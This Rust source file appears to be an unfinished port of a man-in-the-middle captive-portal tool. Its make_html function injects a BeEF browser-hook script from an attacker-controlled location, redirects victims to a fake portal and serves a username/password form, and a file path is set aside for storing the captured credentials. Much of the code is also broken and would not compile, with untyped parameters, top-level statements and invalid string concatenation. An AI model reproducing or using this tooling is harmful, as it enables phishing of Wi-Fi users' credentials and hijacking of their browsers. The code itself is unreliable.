/*
Total conversion of the project to Rust
rustup toolchain add nightly
cargo install +nightly racer
*/
extern crate clap;

//Basic stuff
use std::char;
use std::thread;
use std::time::Duration;
use std::io::{self, Write};
use termcolor::{Color, ColorChoice, ColorSpec, StandardStream, WriteColor};
use clap::{Arg, App};

//Ncurses
extern crate ncurses;
use ncurses::*;


//Network stuff
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
use std::net::TcpListener;
use std::io::prelude::*;
use std::net::TcpStream;

/* Term Color Function */
fn termcolorprint(text_color, text ) -> io::Result<()> {
  let mut stdout = StandardStream::stdout(ColorChoice::Always);
  stdout.set_color(ColorSpec::new().set_fg(Some(Color::text_color)))?;
  writeln!(&mut stdout, text)
};


/*HTML for the login*/
//Add beef hook conditional to replace normal stuff with mean stuff
/*
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Hello!</title>
  </head>
  <body>
    <h1>Hello!</h1>
    <p>Hi from Rust</p>
  </body>
</html>
*/

/* Bad request response*/
// add stuff here
/*
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Hello!</title>
  </head>
  <body>
    <h1>Oops!</h1>
    <p>Sorry, I don't know what you're asking for.</p>
  </body>
</html>
*/


// Some variables for static things

// Assign the following two by getting terminal dimensions
let height_rows               = 0;
let width_columns             = 0;

// set by finding minimum size necessary for properly displaying the data
// presented
let mut init_display_height   = 0;
let mut init_display_width    = 0;  

// Defaults for beefhook, captive portal, and ncurses switches
let hook                      = true;
let PORTAL                    = true;
let PORT                      = 80;
let curses                    = true;

// Path to the file for storing credentials.
let credentials_file          = "/path/to/file";

// add an error logger HERE maybe?
fn termcolorprint(text_color, text ) -> io::Result<()> {
    let mut stdout = StandardStream::stdout(ColorChoice::Always);
    stdout.set_color(ColorSpec::new().set_fg(Some(Color::text_color)))?;
    writeln!(&mut stdout, text)
};

// add conditional to use ncurses output
fn shutdown_server(){
    termcolorprint( "red", "SHUTTING DOWN");

};

/* Setup http responder*/
fn setup_listener(){
    let listener = TcpListener::bind("127.0.0.1:80").unwrap();
    for stream in listener.incoming() {
        let stream = stream.unwrap();
        // Spawn a new thread for every connection
        // add code to limit threads
        thread::spawn(|| {
            handle_connection(stream);
        });
    }
}

// server handler
fn handle_connection(mut stream: TcpStream) {
    
    /*Request listener*/ 
    let mut buffer = [0; 512];
    stream.read(&mut buffer).unwrap();
    println!("Request: {}", String::from_utf8_lossy(&buffer[..]));

    let get = b"GET / HTTP/1.1\r\n";
    /* Signal responder*/
        // if its a good request
    if buffer.starts_with(get) {
        let contents = fs::read_to_string("hello.html").unwrap();
        let response = format!("HTTP/1.1 200 OK\r\n\r\n{}", contents);
        stream.write(response.as_bytes()).unwrap();
        stream.flush().unwrap();
        // if its a bad request
    } else {
        let status_line = "HTTP/1.1 404 NOT FOUND\r\n\r\n";
        let contents = fs::read_to_string("404.html").unwrap();
        let response = format!("{}{}", status_line, contents);
        stream.write(response.as_bytes()).unwrap();
        stream.flush().unwrap();
    }

}

// currently converting from cpp to rust
/*
returns a string containing the html needed to make wither a redirect or form with
 beefhook location and formaction as the first and second parameters respectively.
 both strings;
 @param hook_loc Beef Hook Location
 @param form_action Form Action
 @param form_or_redirect, true to return redirect, false to return form
 @return The html you need when the xenomorphs come calling

*/
fn make_html( hook_loc,  redirect,  formaction, bool form_or_redirect) {
    let html_redirect_body;
    let html_form_body;
    let hook_location;
    let redirect_ip = redirect;
    let html_login_head ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
    let html_form_body_top = "<body><form class=\"login\" ";
    let form_action = "action=\"" + formaction + "\" ";
    let html_form_body_bottom = " method=\"post\">\
        <input type=\"text\" name=\"username\" value=\"username\">\
        <input type=\"text\" name=\"password\" value=\"password\">\
        <input type=\"submit\" name=\"submit\" value=\"submit\">\
        </form>\
        </body>\
        </html>";
    let html_redirect_head = "<html><head>";
    let beef_hook = "<script src=" + hook_loc + "></script>";
    let html_redirect_middle = "<meta http-equiv=\"refresh\" content=\"0; url=http://" + redirect_ip + "\" />";
    let redirect_bottom = "</head><body><b>Redirecting to MITM hoasted captive portal page</b></body></html>";
    if (form_or_redirect == true) {
        html_redirect_body = html_redirect_head + beef_hook + html_redirect_middle + redirect_bottom;
        return html_redirect_body;
    } else if (form_or_redirect == false ) {
        html_form_body = html_login_head + html_form_body_top + form_action + html_form_body_bottom;
        return html_form_body;
    };
};

fn main()
{
  /* Setup ncurses. */
  initscr();
  raw();

  /* Allow for extended keyboard (like F1). */
  keypad(stdscr(), true);
  noecho();

  /* Prompt for a character. */
  printw("Enter a character: ");

  /* Wait for input. */
  let ch = getch();
  if ch == KEY_F1
  {
    /* Enable attributes and output message. */
    attron(A_BOLD() | A_BLINK());
    printw("\nF1");
    attroff(A_BOLD() | A_BLINK());
    printw(" pressed");
  }
  else
  {
    /* Enable attributes and output message. */
    printw("\nKey pressed: ");
    attron(A_BOLD() | A_BLINK());
    printw(format!("{}\n", char::from_u32(ch as u32).expect("Invalid char")).as_ref());
    attroff(A_BOLD() | A_BLINK());
  }

  /* Refresh, showing the previous message. */
  refresh();

  /* Wait for one more character before exiting. */
  getch();
  endwin();
}